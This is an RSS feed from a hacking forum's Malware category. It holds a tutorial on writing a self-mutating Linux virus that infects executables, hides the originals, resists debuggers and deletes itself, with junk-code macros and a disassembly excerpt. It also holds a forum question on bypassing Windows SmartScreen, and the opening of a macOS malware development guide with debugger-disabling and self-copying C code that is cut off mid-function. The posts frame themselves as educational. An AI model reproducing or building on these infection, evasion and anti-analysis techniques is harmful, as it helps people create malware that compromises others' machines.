<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:discourse="http://www.discourse.org/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Malware - 0x00sec - The Home of the Hacker</title>
    <link>https://0x00sec.org/c/malware/56</link>
    <description>Topics in the &#39;Malware&#39; category </description>
    
      <lastBuildDate>Tue, 23 Apr 2024 12:51:56 +0000</lastBuildDate>
      <atom:link href="https://0x00sec.org/c/malware/56.rss" rel="self" type="application/rss+xml" />
        <item>
          <title>Writing a Self-Mutating Malware</title>
          <dc:creator><![CDATA[0xf00I]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <h1><a name="introduction-1" class="anchor" href="https://0x00sec.org#introduction-1"></a>Introduction</h1>
<p>In this article, we’ll cover Self-mutating/self-modifying malware with the simplest obfuscation techniques out there, covering some characteristics of both polymorphic and metamorphic. Since I’ve discussed malware in previous articles, I’ll stick to the usual routine: giving a brief overview of how the malware operates, providing a few examples, and then a detailed explanation. <a href="https://github.com/0xf00sec/Vx" rel="noopener nofollow ugc">Source Code</a></p>
<p>So, what’s the deal with “Metamorphic”? Well, making malware that can’t be easily detected is quite challenging. You have to change how the code looks without altering what it does, especially if you’re starting from scratch. This is where “Polymorphism” comes into play. It involves various techniques, like switching up the packer used. In short, it makes detecting the malware a time-consuming and resource-intensive task. The malware encrypts its original code to evade pattern recognition and uses self-modification to conceal its inner workings. Now, metamorphic malware takes it a step further by transforming itself into an equivalent form.  Then, why aren’t there more metamorphic malware? Simple: they are extremely difficult to make, as I show in this article, Inspired by this <a href="https://stackoverflow.com/questions/10113254/metamorphic-code-examples" rel="noopener nofollow ugc">Post</a>.</p>
<p>You need to have some experience with C and low level assembly. You must also be very familiar with the Linux, All of the discussion here is pretty complicated, but I’ll try to make it as easy to follow as possible.</p>
<h1><a name="overview-2" class="anchor" href="https://0x00sec.org#overview-2"></a>Overview</h1>
<p>Metamorphic malware has the ability to transform into numerous variants while spreading by automatically obfuscating parts of its executable code. This involves actions like adding instructions of different lengths, incorporating unnecessary instructions and loops, and ultimately, register swapping – the highest level of self-mutation, a significant step towards achieving perfect stealth, and the most efficient path to assembly heaven. This essentially means that every aspect of the code undergoes mutation, making it exceptionally challenging to detect. As demonstrated in this article, we’ll explore the importance of having the right ideas and objectives, along with the various options and implications of design choices.</p>
<p>Alright, let’s dig into the main objective of this malware, spreading! now, why create such a code? Well, This is not something you would ever do outside of exploring a curiosity. So, we’re putting this malware to use.</p>
<p>Before the updates, this malware starts by scanning directories, searching for executable files that have not yet been infected. Once identified, it takes action by overwriting them with its modified code. After that, it subtly runs the original executable from a saved copy, making it appear untouched. Not much harm, right? Except for one small thing – it can be altered to perform anything from opening a reverse shell to code injection.</p>
<h1><a name="how-it-works-3" class="anchor" href="https://0x00sec.org#how-it-works-3"></a>How it works</h1>
<p>Initially, it loads a copy of itself into memory, focusing on the code within the .text section where the main code resides. The aim is to meticulously examine this code for any irregularities or hidden junk instructions. Once these irregularities are identified, Vx substitutes them with randomly generated counterparts. These new instructions are inserted within the functions marked by “JUNKLEN” sections, which are randomly selected for modification.</p>
<p>What you’re essentially doing is moving a value to a register or adding the content of one register to a variable. This simplifies how you approach coding metamorphism (which, in fact, is similar to coding polymorphism). All the instructions and groups of instructions act as macros for the operation you truly want to execute. The aim here is to train yourself to view the code as a series of instructions that aren’t tied to the final code, but rather as operations necessary to accomplish a larger task.</p>
<ol>
<li>
<p><strong>Writing Instructions :</strong> Writing assembly instructions into a buffer under specific conditions. It simplifies the details of the assembly language and focuses on the main goal of generating instructions based on factors like available space and the required instruction type.</p>
</li>
<li>
<p><strong>Reading Instructions :</strong> In this task, assembly instructions are read from the buffer and assessed for their validity using specific criteria. It simplifies the individual instruction details and the identification of valid instructions through patterns or specific characteristics.</p>
</li>
<li>
<p><strong>Replacing Junk Code :</strong> Identifying sequences of “junk” code within the assembly and substituting them with updated instructions. It simplifies the specific instructions related to the junk code and concentrates on the broader objective of replacing outdated code segments with new ones to enhance the code’s efficiency or obscure its behavior.</p>
</li>
</ol>
<p>After altering the code in memory, Vx saves the updated data back onto the system. With each execution, Vx generates a fresh copy of itself, injecting nonsensical assembly code and assigning it a unique name each time. In the transformation process, portions of the original code are substituted with randomly generated instructions. These replacements follow a simple pattern: starting with a basic operation, adding more operations, and then restoring everything to its original state. To clarify, rather than replacing itself every time it runs, Vx maintains its modifications.</p>
<pre><code class="lang-c">// Define assembly instructions as macros
#define B_PUSH_RAX ".byte 0x50\n\t" // push rax
#define B_PUSH_RBX ".byte 0x53\n\t" // push rbx
#define B_POP_RAX  ".byte 0x58\n\t" // pop rax
#define B_POP_RBX  ".byte 0x5b\n\t" // pop rbx
#define B_NOP ".byte 0x48,0x87,0xc0\n\t" // REX.W xchg rax,rax

// Encoded binary bytes in hex for runtime identification
#define H_PUSH 0x50 // push + reg
#define H_POP  0x58 // pop + reg
#define H_NOP_0 0x48 // --------------------
#define H_NOP_1 0x87 // REX.W xchg rax,rax |
#define H_NOP_2 0xC0 // --------------------

// Macro for injecting the junk assembly sequence
#define JUNK_ASM(B_PUSH, B_NOP, JUNKLEN) \
    __asm__(B_PUSH) \
    __asm(B_NOP H_NOP_0 H_NOP_1 H_NOP_2 H_NOP) \
    __asm(B_NOP H_NOP_0 H_NOP_1 H_NOP_2 H_NOP) \
    __asm(B_NOP H_NOP_0 H_NOP_1 H_NOP_2 H_NOP JUNKLEN-4 "nop\n\t")

// Macro for randomly calling one of the varying junk assembly functions
#define RANDOM_CALL() (rand() % 5)
</code></pre>
<p>we code with macros!. It’s the magic stuff, This setup adds  unpredictability to the code, giving it that polymorphic flavor. So, there you have it - a sneak peek into how we shake things up in the code, making it its own polymorphic tune.</p>
<p>The blocks of junk assembly instructions follow this pattern so they can be recognized:</p>
<ul>
<li><code>r1</code> is a random register selected from: RAX, RBX, RCX, or RDX</li>
<li><code>r2</code> is another random register selected from: RAX, RBX, RCX, or RDX</li>
</ul>
<p><img src="https://0xf00sec.github.io/images/IMG0005.png" alt="1" width="690" height="276"> </p>
<p>Notice the <code>JUNK_ASM</code> macro calls inserted at random points within the code. These calls serve as markers indicating where our malware may make modifications.</p>
<p>We’ve implemented a function dedicated to inspecting instructions within our malware. Here’s how it operates: after identifying the registers associated with <code>PUSH</code> and <code>POP</code> operations at the ends of sequences, it validates instructions at specific positions. Its primary task is to determine whether an instruction matches any of our predefined “junk” operations while ensuring alignment with the provided parameter.</p>
<p>When a match is found, the function returns the length of the instruction. If no match is found, it returns nothing. This function helps in accurately handling instructions, distinguishing valid ones from invalid ones.</p>
<p>Now, The main loop of our malware. This loop is crucial for identifying and replacing sequences of junk operations. It searches for a <code>PUSH</code> command followed by a <code>POP</code> command on the same register, typically eight bytes apart, as defined by our constant, <code>JUNKLEN</code>. This process involves identifying and rectifying these sequences within the assembly code.</p>
<p>During the first execution of the malware, outdated assembly sequences are replaced with updated ones. Notably, the functions containing these unique assembly segments are invoked in a random sequence, introducing an element of unpredictability.</p>
<h2><a name="simplistic-4" class="anchor" href="https://0x00sec.org#simplistic-4"></a>Simplistic</h2>
<p>Simply put, the <code>Vx</code> scans through its own binary to identify sequences of “intelligent garbage”: do-nothing code that is inserted as if it were part of the algorithm. These sections consist of assembly instructions that serve to obscure the malware’s true behavior and confuse analysis. Upon detecting these junk code sequences, it replaces them with freshly generated instructions.</p>
<p>These new instructions are entirely random and lack any real impact on the malware’s functionality. However, their presence adds a layer of ‘complexity,’</p>
<pre><code class="lang-auto">void _entry(void){
    JUNK_ASM;
} 
</code></pre>
<p>Operations and logic are preserved. The malware can execute and spread without any issue. It also possesses the ability to dynamically mutate its code with each execution. Following the mutation process, it propagates itself into other executable files within the same directory, carrying with it the mutated versions of its code.</p>
<h1><a name="emulator-5" class="anchor" href="https://0x00sec.org#emulator-5"></a>“Emulator”</h1>
<p>Alright, let’s cover some of the functionalities. First things first, the command executes to hide the original executable file, embedding the malware within it. It also embeds ‘Vx’ in the executable to ensure its stealthy presence within the system. Of course, this isn’t exactly stealthy, but you get the idea here, We’re not writing an actual malware, So once ‘Vx’ is embedded in the executable and a copy of the original executable is hidden, it creates a hidden copy of the original executable with a prefix ‘.vx_’. Then, it makes the original executable file executable and writes the modified code into it.</p>
<p>To make it a more interesting, we’ve added my favorite anti-debugging technique <code>INT3 Trap Shellcode triggers a breakpoint interrupt</code>, By incorporating INT3 instructions within the <code>shellcode</code>, it attempts to interrupt and disrupt the debugging process, making it difficult for a debugger to analyze the code flow.</p>
<p><img src="https://0xf00sec.github.io/images/IMG000A.png" alt="2" width="690" height="220"></p>
<p>“no debugger” but manually assign it. This technique known as stack string technique, Manually assigning strings that are constructed on the stack at runtime is an easy yet lazy way to obscure string data within a program. It involves blending string data with opaque operand instructions. You’ll notice the MOV instructions transferring constant values into adjacent locations on the stack, as shown:</p>
<p><img src="https://0xf00sec.github.io/images/IMG00004.png" alt="3" width="690" height="158"></p>
<p>while we’re messing around with Anti-Analysis, let’s add in a Self-Deleting feature too. I’m pretty sure I’ve shown this trick somewhere, but can’t really remember where. Anyway, it’s easy in Linux. Just start a child process that runs a separate thread to delete the executable file. You can trigger it by checking a condition or just making a simple function call,</p>
<pre data-code-wrap="asm"><code class="lang-plaintext">        00101ee9 e8 88 fb        CALL       execute_bash                             
        00101eee 48 8b 45 f0     MOV        RAX,qword ptr [RBP + local_18]
        00101ef2 48 8b 00        MOV        RAX,qword ptr [RAX]
        00101ef5 48 89 c7        MOV        RDI,RAX
        00101ef8 e8 82 f8        CALL       SelfDelete                               
        00101efd b8 00 00        MOV        EAX,0x0
        00101f02 c9              LEAVE
        00101f03 c3              RET
</code></pre>
<p>As you can see we call it after we execute malware to Execute the original, hidden executable, so the actual vx will be deleted and left with only the infected dummy, (vx) continues its execution and eventually exits. The child process, responsible for self-deletion, persists until it successfully deletes the executable file and terminates itself.</p>
<p>!!! Alright, let’s give it a try. First, let’s write a simple dummy code, compile it, and put it in the directory. Then, let’s test our propagation example, which will embed ‘vx’ into the dummy example, essentially infecting the dummy with its morphed code:</p>
<p><img src="https://0xf00sec.github.io/images/IMG00008.png" alt="4" width="690" height="340"></p>
<p>As seen above, ‘vx’ successfully embedded itself into the dummy code, overwriting it with its infected, morphed version. The original dummy is then executed from a hidden file it was copied to during the propagation phase, disguising the fact that the actual executable was infected. Essentially, each propagation employs a unique version of the morphed code, You can take this further by adding more functionalities and techniques, like code injection and persistence. Although the code is designed for changes, We’ve touched on the idea of self-modifying/mutating malware and code morphing, but this only skims the surface of true Metamorphism and self-mutating code. Let’s not jump the gun.</p>
<p>I recommend running the generated code through a debugger instead of just executing it directly and hoping for the best. (VM), you can easily disable the Anti-Debugging astuce or bypass ;). Additionally, you can introduce points in the code where you can pop into the assembly view and examine the generated code.</p>
<p>That’s all for now. I hope you learned something from this revisit of the article “Metamorphic Malware.” When it comes to malware, a little bit of obfuscation will usually get you by. You don’t really need to write a Mutation engine, as it introduces unnecessary complexity that doesn’t really help maintain the malware’s features and functionalities, Metamorphism the strongest technique ever ideated, ever created. So keep it simple and clean. Until next time!</p>
            <p><small>1 post - 1 participant</small></p>
            <p><a href="https://0x00sec.org/t/writing-a-self-mutating-malware/40213">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/writing-a-self-mutating-malware/40213</link>
          <pubDate>Tue, 23 Apr 2024 12:51:56 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-40213</guid>
          <source url="https://0x00sec.org/t/writing-a-self-mutating-malware/40213.rss">Writing a Self-Mutating Malware</source>
        </item>
        <item>
          <title>How to Bypass windows defender smartscreen?</title>
          <dc:creator><![CDATA[Kaiju]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p>Hello, my friends. Lately, I have been struggling to bypass this horrendous image below from the <strong>windows defender smartscreen</strong>.<br>
<a href="https://winscp.net/forum/display/3617/Screenshot_1.jpg" rel="noopener nofollow ugc">Print windows defender smartscreen.jpg</a></p>
<p>For my current understanding, this happens because the executable is not signed. So I came here to ask if you guys can provide more information, links, videos, or literary anything on the subject.<br>
I want to learn more on how to bypass this, but it has been very hard to find information.<br>
Do you guys know any other techniques to bypass this other than signing the executable?<br>
Ty all</p>
<p>Sharing a very interesting technique =&gt; <a href="https://infosecwriteups.com/cve-2023-36025-an-in-depth-analysis-of-circumventing-windows-smartscreen-security-6ff05c8b69d0" class="inline-onebox" rel="noopener nofollow ugc">CVE-2023–36025: An In-Depth Analysis of Circumventing Windows SmartScreen Security | by Security Lit Limited | InfoSec Write-ups</a></p>
            <p><small>5 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/how-to-bypass-windows-defender-smartscreen/39833">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/how-to-bypass-windows-defender-smartscreen/39833</link>
          <pubDate>Fri, 29 Mar 2024 18:33:59 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-39833</guid>
          <source url="https://0x00sec.org/t/how-to-bypass-windows-defender-smartscreen/39833.rss">How to Bypass windows defender smartscreen?</source>
        </item>
        <item>
          <title>macOS Malware Development</title>
          <dc:creator><![CDATA[0xf00I]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <h1><a name="introduction-1" class="anchor" href="https://0x00sec.org#introduction-1"></a>Introduction</h1>
<p>In this article, we’ll delve into the world of designing and developing malware for macOS, which is essentially a Unix-based operating system. We’ll take a classic approach to exploring Apple’s internals. All you need is a basic understanding of exploitation, along with knowledge of C and Python programming, as well as some familiarity with low-level assembly language to grasp the details here. While the topics discussed may be advanced, I’ll do my best to present them smoothly.</p>
<p>Let’s start by understanding the macOS architecture and its security features. We’ll then delve into the internals, covering key elements like the Mach API and kernel, and we’ll walk through some basic system calls and examples that are easy to understand. Next, we’ll introduce a dummy malware. Later on, we’ll explore code injection techniques and how they’re utilized in malware. We’ll also touch on persistence methods. To conclude, we’ll demonstrate a basic implementation of shellcode injection and persistence. Throughout, we’ll provide a detailed, step-by-step breakdown of the code and techniques involved.</p>
<h2><a name="background-2" class="anchor" href="https://0x00sec.org#background-2"></a>Background</h2>
<p>a little background from the internet, The Mac OS X kernel (xnu) is an operating system kernel with a unique lineage, merging the research-oriented Mach microkernel with the more traditional and contemporary FreeBSD monolithic kernel. The Mach microkernel combines a potent abstraction—Mach message-based interprocess communication (IPC)—with several cooperating servers to constitute the core of an operating system. Responsible for managing separate tasks within their own address spaces and comprising multiple threads, the Mach microkernel also features default servers that offer services like virtual memory paging and system clock management.</p>
<p>However, the Mach microkernel alone lacks crucial functionalities such as user management, file systems, and networking. To address this, the Mac OS X kernel incorporates a graft of the FreeBSD kernel, specifically its top-half (system call handlers, file systems, networking, etc.), ported to run atop the Mach microkernel. To mitigate performance concerns related to excessive IPC messaging between kernel components, both kernels reside in the same privileged address space. Nevertheless, the Mach API accessible from kernel code remains consistent with the Mach API available to user processes.</p>
<h1><a name="osx-3" class="anchor" href="https://0x00sec.org#osx-3"></a>Osx</h1>
<p>Before delving into macOS development, it’s crucial to grasp the fundamentals of the operating system. In this discussion, we’ll primarily focus on understanding the security protections, particularly System Integrity Protection (SIP),</p>
<p>SIP serves as a vital security feature designed to safeguard critical system files, directories, and processes from unauthorized modification or tampering by applications. It imposes restrictions on write access to protected system locations, even for processes with root privileges, thus preventing unauthorized alterations. Moreover, SIP implements additional security measures for system extensions and kernel drivers. For instance, kernel extensions are required to be signed by Apple or by developers using a valid Developer ID. This stringent requirement ensures that only trusted extensions are permitted to load into the kernel, bolstering the overall security of the system.</p>
<p><img src="https://0xf00sec.github.io/images/IMG1.png" width="690" height="341"> </p>
<p>As we can see, SIP (System Integrity Protection) is turned on, indicating that the system is benefiting from its security features. The presence of the “restricted” flag on certain directories highlights SIP’s protection of those specific areas. It’s important to note that SIP’s shielding may not extend to subdirectories within a SIP-protected directory.</p>
<p>To overcome this limitation, <code>Firmlinks</code> come into play. These allow certain directories to be “firmlinked,” which are special symbolic links protected by SIP. This ensures their functionality even in SIP-protected locations, enhancing compatibility, Which operate seamlessly, allowing applications and scripts to treat them as regular symbolic links without any special handling. This enables the creation of symbolic links in directories like <code>/usr, /bin</code>, <code>/sbin</code>, and <code>/etc</code>, which were previously inaccessible due to SIP.</p>
<p>By making use of <code>firmlinks</code>, developers and users can address compatibility challenges while still enjoying the security advantages of SIP. It strikes a balance between system protection and accommodating the needs of applications and scripts that rely on symbolic links in macOS. The use of firmlinks allows for access and modification of certain directories, even in traditionally protected locations. For instance, a firmlink can grant write access to <code>/usr/local</code>, providing flexibility for installing and managing software and scripts in that directory.</p>
<h2><a name="entitlements-4" class="anchor" href="https://0x00sec.org#entitlements-4"></a>Entitlements</h2>
<p>Now, onto Entitlements, Entitlements are permissions granted to applications on macOS, dictating their level of access and capabilities within the system. They control the application’s ability to interact with various system resources, including the network, file system, hardware, and user privacy-related information. By granting specific entitlements, macOS ensures that applications have the necessary permissions to perform their intended tasks while maintaining system integrity and protecting user privacy.</p>
<p>Entitlements are typically stored in the application’s Info.plist file, which is located within the <strong>.app</strong> bundle. The <strong>Info.plist</strong> file contains metadata and configuration details about the application, and it includes key-value pairs representing the entitlements. Each entitlement is represented by a key, denoting the specific permission or access level, and a value that defines its corresponding setting.</p>
<ul>
<li>For example, an entitlement entry in the Info.plist file may appear as follows:</li>
</ul>
<pre><code class="lang-xml">&lt;key&gt;com.apple.security.network.client&lt;/key&gt;
&lt;true/&gt;
</code></pre>
<p>In this case, the entitlement with the key “com.apple.security.network.client” indicates that the application has permission to act as a network client, granting it access to network resources.</p>
<ul>
<li>We can obtain entitlements of an application by using the following command:</li>
</ul>
<pre><code class="lang-bash">codesign --display --entitlements - /path/to/foo.app
</code></pre>
<p>The specific entitlements and their corresponding keys and values can vary based on the application’s requirements and the resources it needs to access. By defining entitlements, macOS ensures that applications operate within predefined boundaries, promoting security, privacy, and controlled access to system resources.</p>
<h2><a name="infoplist-5" class="anchor" href="https://0x00sec.org#infoplist-5"></a>Info.plist</h2>
<p>Now, let’s talk about Property List (plist) files. file format used on macOS to store structured data, such as configuration settings, preferences, and metadata. They have a hierarchical structure with key-value pairs and support various data types. Property list files can be in XML or binary format.</p>
<p>In the context of macOS, property list files are commonly used for storing application metadata, entitlements, sandboxing settings, and code signing details. For example:</p>
<ul>
<li><em>Entitlements:</em> Property list files, like the Info.plist, can contain entitlements that grant permissions to applications, specifying their access to system resources.</li>
<li><em>Sandbox:</em> Property list files define sandbox settings that restrict an application’s access to resources, enhancing security and protecting user privacy.</li>
<li><em>Code Signing:</em> Property list files store information related to code signing, verifying the authenticity and integrity of an application.</li>
</ul>
<p>Property List (plist) files can hold various data types and have a hierarchical structure. Here are some commonly used data types and an example of the plist file structure:</p>
<ol>
<li>Data Types:
<ul>
<li>String: A sequence of characters.</li>
<li>Number: Represents numeric values, including integers and floating-point numbers.</li>
<li>Boolean: Represents true or false values.</li>
<li>Date: Represents a specific date and time.</li>
<li>Array: An ordered collection of values.</li>
<li>Dictionary: A collection of key-value pairs, where each key is unique.</li>
</ul>
</li>
</ol>
<p>Here’s an example of a plist file structure:</p>
<pre><code class="lang-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;plist version="1.0"&gt;
  &lt;dict&gt;
    &lt;key&gt;com.apple.security.app-sandbox&lt;/key&gt;
    &lt;true/&gt;
    &lt;key&gt;com.apple.security.files.user-selected.read-only&lt;/key&gt;
    &lt;true/&gt;
    &lt;key&gt;com.apple.security.network.client&lt;/key&gt;
    &lt;true/&gt;
  &lt;/dict&gt;
&lt;/plist&gt;
</code></pre>
<p>In this example, the property list file contains a dictionary with several entitlement keys related to sandboxing. Each key represents a specific entitlement, and the value <code>&lt;true/&gt;</code> indicates that the corresponding entitlement is enabled.</p>
<p>The three entitlements mentioned in this example are:</p>
<ul>
<li><code>com.apple.security.app-sandbox</code>: Enables sandboxing for the application.</li>
<li><code>com.apple.security.files.user-selected.read-only</code>: Allows read-only access to user-selected files.</li>
<li><code>com.apple.security.network.client</code>: Grants the application permission to act as a network client.</li>
</ul>
<p>This simplified example demonstrates how property list files can store entitlements related to sandboxing, providing a structured format for specifying the application’s access and permissions within the sandbox environment.</p>
<ul>
<li>We can use otool to read Info.plist in different formats:</li>
</ul>
<pre><code class="lang-bash">plutil -convert xml1 /Applications/Safari.app/Contents/Info.plist -o - 
plutil -convert json /Applications/Safari.app/Contents/Info.plist -o - 
</code></pre>
<p>Overall, property list files play a crucial role in macOS by providing a structured and standardized format to store important information related to entitlements, sandboxing, code signing, and more. They enable applications and system components to access and manage this data efficiently, contributing to the security and integrity of the macOS ecosystem.</p>
<p>That’s all we need to know for now. There’s more to explore, such as Gatekeeper, Sandboxing, App Bundles, and so on, but these are the most important security mechanisms that matter to us for development. Now let’s delve a bit deeper and discuss internal architecture. Why focus on internals? Well, even though I’m not planning to develop a rootkit or anything as advanced, it’s crucial to understand the OS as thoroughly as possible from a developer’s perspective. After all, we’re writing software.</p>
<h1><a name="mach-apis-6" class="anchor" href="https://0x00sec.org#mach-apis-6"></a>Mach API’s</h1>
<p>Let’s take a quick look at Mach. Initially designed as a communication-centric operating system kernel with robust multiprocessing support, Mach aimed to lay the groundwork for various operating systems. It favored a microkernel architecture, aiming to keep essential OS services like file systems, I/O, memory management, networking, and different OS personalities separate from the kernel.</p>
<p>XNU, whimsically named “X is not UNIX,” serves as the kernel for Mac OS X. Positioned at the core, Darwin and the rest of the OS X software stack rely on the XNU kernel.</p>
<p>XNU stands out as a hybrid operating system, blending a hardware/Io tasking interface from the minimalist Mach microkernel with elements from FreeBSD kernel and its POSIX-compliant API. Understanding how programs map to processes in virtual memory on OS X can be a bit tricky due to overlapping definitions. For example, the term “thread” could refer to either the POSIX API pthreads from BSD or the fundamental unit of execution within a Mach task. Moreover, there are two distinct sets of syscalls, each mapped to positive (Mach) or negative (BSD) numbers.</p>
<p>Mach provides a virtual machine interface, abstracting system hardware—a common feature in many operating systems. Its core kernel is designed to be simple and extensible, boasting an Inter-Process Communication (IPC) mechanism that underpins many kernel services. Notably, Mach seamlessly integrates IPC capabilities with its virtual memory subsystem, leading to optimizations and simplifications across the OS.</p>
<p>On OS X, we deal with “tasks” rather than processes. Tasks, similar to processes, serve as OS-level abstractions containing all the resources needed to execute a program. Technically, Mach refers to its processes as tasks, although the concept of a BSD-style process that encapsulates a Mach task persists. Resources within a task include:</p>
<ul>
<li>A virtual address space</li>
<li>Inter-process communication (IPC) port rights</li>
<li>One or more threads</li>
</ul>
<p>“Ports” serve as an inter-task communication mechanism, using structured messages to transmit information between tasks. Operating solely in kernel space, ports act like P.O. Boxes, albeit with restrictions on message senders. Ports are identified by Task-specific 32-bit numbers.</p>
<p>Threads are units of execution scheduled by the kernel. OS X supports two thread types (Mach and pthread), depending on whether the code originates from user or kernel mode. Mach threads reside at the OS’s lowest level in kernel-mode, while pthreads from the BSD realm execute programs in user-mode. (More in this, later)</p>
<p>Mach redefines the traditional Unix notion of a process into two components: a task and a thread. In the kernel, a BSD process aligns with a Mach task. A task serves as a framework for executing threads, encapsulating resources and defining a program’s protection boundary. Mach ports, versatile abstractions, facilitate IPC mechanisms and resource operations.</p>
<p>IPC messages in Mach are exchanged between threads for communication, carrying actual data or pointers to out-of-line data. Message transfer is asynchronous, with port capabilities exchanged through messages.</p>
<p>Mach’s virtual memory system encompasses machine-independent components like address maps and memory objects, alongside machine-dependent elements like the physical map. Memory objects serve as containers for data mapped into a task’s address space, managed by various pagers handling distinct memory types. Exception ports, assigned to each task and thread, facilitate exception handling, allowing multiple handlers to suspend affected threads, process exceptions, and resume or terminate threads accordingly.</p>
<p>Let’s explore the basics of Mach System Calls, including retrieving system information and performing code injection. This will provide a fundamental understanding of interacting with macOS, By the way, a system call is a function of the kernel invoked by a user space. It can involve tasks like writing to a file descriptor or exiting a program. Typically, these system calls are wrapped by C functions in the standard library.</p>
<h2><a name="baby-steps-7" class="anchor" href="https://0x00sec.org#baby-steps-7"></a>Baby Steps</h2>
<p>If we head over to the <a href="https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/" rel="noopener nofollow ugc">Mach IPC Interface</a> or <a href="https://developer.apple.com/documentation/kernel/" rel="noopener nofollow ugc">Apple documentation</a>  we can find a Mach system call that’s pretty handy for getting basic info about the host system. It tells us stuff like how many CPUs there are, both maximum and available, the physical and logical CPUs, memory size, and the max memory size. This call is <code>host_info()</code>, and it’s super useful for getting details about a host, like what kind of processors are installed, how many are currently available, and the total memory size.</p>
<p>Now, like a lot of Mach “info” calls, <code>host_info()</code> needs a flavor argument to specify what kind of info you want. For instance:</p>
<pre><code class="lang-c">kern_return_t host_info(host_t host, host_flavor_t flavor,
                        host_info_t host_info,
                        mach_msg_type_number_t host_info_count);
</code></pre>
<ul>
<li><code>HOST_BASIC_INFO</code>: Returns basic system information.</li>
<li><code>HOST_SCHED_INFO</code>: Provides scheduler-related data.</li>
<li><code>HOST_PRIORITY_INFO</code>: Offers scheduler-priority-related information.</li>
</ul>
<p>Besides <code>host_info()</code>, other calls like <code>host_kernel_version()</code>, <code>host_get_boot_info()</code>, and <code>host_page_size()</code> can be employed to access miscellaneous system details.</p>
<pre><code class="lang-c">int main() {
    kern_return_t kr; /* the standard return type for Mach calls */
    mach_port_t myhost;
    char kversion[256]; 
    host_basic_info_data_t hinfo;
    mach_msg_type_number_t count;
    vm_size_t page_size;
  

    // Retrieve System Information
    printf("Retrieving System Information...\n");

    // Get send rights to the name port for the current host
    myhost = mach_host_self();

    // Get kernel version
    kr = host_kernel_version(myhost, kversion);
    EXIT_ON_MACH_ERROR("host_kernel_version", kr);

    // Get basic host information
    count = HOST_BASIC_INFO_COUNT; // size of the buffer
    kr = host_info(myhost, HOST_BASIC_INFO, (host_info_t)&amp;hinfo, &amp;count);
    EXIT_ON_MACH_ERROR("host_info", kr);

    // Get page size
    kr = host_page_size(myhost, &amp;page_size);
    EXIT_ON_MACH_ERROR("host_page_size", kr);

    printf("Kernel Version: %s\n", kversion);
    printf("Maximum CPUs: %d\n", hinfo.max_cpus);
    printf("Available CPUs: %d\n", hinfo.avail_cpus);
    printf("Physical CPUs: %d\n", hinfo.physical_cpu);
    printf("Maximum Physical CPUs: %d\n", hinfo.max_cpus);
    printf("Logical CPUs: %d\n", hinfo.logical_cpu);
    printf("Maximum Logical CPUs: %d\n", hinfo.logical_cpu);
    printf("Memory Size: %llu MB\n", (unsigned long long)(hinfo.memory_size &gt;&gt; 20));
    printf("Maximum Memory: %llu MB\n", (unsigned long long)(hinfo.max_mem &gt;&gt; 20));
    printf("Page Size: %u bytes\n", (unsigned int)page_size);

    // Clean up and exit
    mach_port_deallocate(mach_task_self(), myhost);
    exit(0);
}
</code></pre>
<p>So, basically, the code is pretty easy to understand. It just grabs system information and shows things like the Kernel version, right? It’s simple and harmless. But if we want to learn more about system calls, we need something different. How about something that acts more like malware?  But let’s keep it simple at first. We can start by writing a code that write a copy of itself to either <code>/usr/bin/</code> or <code>/Library/</code>.</p>
<p>To achieve this kind of behavior, we need to use task operations because we need to control another process and access system processes. I found specific Mach system calls like <code>pid_for_task()</code>, <code>task_for_pid()</code>, <code>task_name_for_pid()</code>, and <code>mach_task_self()</code>, which allow conversion between Mach task ports and Unix PIDs. However, they essentially bypass the capability model, which means they are restricted on macOS due to UID checks, entitlements, SIP, etc., limiting their use, and are not documented as part of a public API and are privileged, typically accessible only by processes with elevated privileges like root or members of the <code>procview group</code>. This limitation poses a challenge because malware would need elevated privileges or execution on a privileged account to work unless obtained through various means.</p>
<p>Thus, we can’t use <code>task_for_pid</code> on Apple platform binaries due to SIP. However, if permitted, we would have the port and could essentially do anything we want including what I’m about to explain. Therefore, So for this example we’ll use <code>mach_task_self()</code> as it typically does not require privileges. It retrieves information about the current task, depending on the security policies enforced.</p>
<pre><code class="lang-c">void hide_process() {
    mach_port_t task_self = mach_task_self();
    kern_return_t kr;

    // Set exception ports to disable debuggers.
    kr = task_set_exception_ports(task_self, EXC_MASK_ALL, MACH_PORT_NULL, EXCEPTION_DEFAULT | MACH_EXCEPTION_CODES, THREAD_STATE_NONE);
    if (kr != KERN_SUCCESS) {
        printf("Uh-oh: Failed to set exception ports: %s\n", mach_error_string(kr));
        exit(EXIT_FAILURE);
    }

    printf("Shhh... Process is now hidden\n");
}
</code></pre>
<p>the function obtains the task port for the current process using <code>mach_task_self()</code>, which essentially retrieves a send right to a task port. In the Mach kernel, a task port represents a task, and sending a message to this port enables actions to be performed on the corresponding task.</p>
<p>Next, to set the exception ports to disable debuggers and other forms of external monitoring. This is achieved through the <code>task_set_exception_ports()</code> function call. and any received messages should be directed to a null Mach port. The process then exits with a failure status.</p>
<pre><code class="lang-c">void copy_file(const char *source_path, const char *dest_path) {
    FILE *source_file = fopen(source_path, "rb");
    if (source_file == NULL) {
        printf("Oops: Failed to open source file for copying: %s\n", strerror(errno));
        exit(EXIT_FAILURE);
    }

    FILE *dest_file = fopen(dest_path, "wb");
    if (dest_file == NULL) {
        printf("Oops: Failed to open destination file for copying: %s\n", strerror(errno));
        fclose(source_file); 
        exit(EXIT_FAILURE);
    }

    char buffer[BUF_SIZE];
    size_t bytes_read;
    while ((bytes_read = fread(buffer, 1, sizeof(buffer), source_file)) &gt; 0) {
        fwrite(buffer, 1, bytes_read, dest_file);
    }

    fclose(source_file);
    fclose(dest_file);

    // Grant execute permission for the copied binary
